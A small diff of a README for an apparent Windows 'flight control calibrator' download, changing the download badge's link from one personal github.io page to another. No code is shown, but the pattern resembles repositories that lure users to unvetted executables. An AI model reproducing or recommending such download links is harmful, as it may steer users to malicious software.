@@ -2,7 +2,7 @@
 
 **flight control calibrator download (Windows)** — Flight Control Calibrator standardizes gyro/accel/compass alignment so tunes start from a trustworthy baseline.
 
-[![Download flight-control-calibrator-download](https://img.shields.io/badge/Download-flight--control--calibrator--download-blueviolet)](https://orf-asfx-klinton.github.io/.github/flight-control-calibrator-download)
+[![Download flight-control-calibrator-download](https://img.shields.io/badge/Download-flight--control--calibrator--download-blueviolet)](https://sybina719.github.io/.github/flight-control-calibrator)
 
 ---
 
